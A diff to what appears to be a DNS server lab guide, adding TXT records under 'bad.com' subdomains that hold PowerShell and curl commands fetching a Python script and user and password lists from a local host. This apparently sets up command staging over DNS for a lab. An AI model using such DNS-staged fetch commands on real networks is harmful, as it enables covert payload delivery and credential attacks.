@@ -75,6 +75,29 @@ Add-DnsServerResourceRecord -ZoneName $subdomain -TXT -Name "@" -DescriptiveText
 Get-DnsServerResourceRecord -ZoneName $subdomain -RRType A
 Get-DnsServerResourceRecord -ZoneName $subdomain -RRType TXT
 ```
+__TXT Entries__
+```
+==> bad.com
+
+-> ext.bad.com
+*
+win_1: powershell (Invoke-WebRequest -Uri 'http://192.168.10.25/get_own_ip.py').Content
+win_2: powershell (Invoke-WebRequest -Uri 'http://192.168.10.25/users.txt').Content
+win_3: powershell (Invoke-WebRequest -Uri 'http://192.168.10.25/pass.txt').Content
+lin_1: curl -s 'http://192.168.10.25/get_own_ip.py'
+lin_2: curl -s 'http://192.168.10.25/users.txt'
+lin_3: curl -s 'http://192.168.10.25/pass.txt'
+
+-> lin.bad.com
+lin_1: curl -s 'http://192.168.10.25/get_own_ip.py'
+lin_2: curl -s 'http://192.168.10.25/users.txt'
+lin_3: curl -s 'http://192.168.10.25/pass.txt'
+
+-> win.bad.com
+win_1: powershell (Invoke-WebRequest -Uri 'http://192.168.10.25/get_own_ip.py').Content
+win_2: powershell (Invoke-WebRequest -Uri 'http://192.168.10.25/users.txt').Content
+win_3: powershell (Invoke-WebRequest -Uri 'http://192.168.10.25/pass.txt').Content
+```
 
 __Install OpenSSH via PowerShell (Windows 10/11)__
 ```
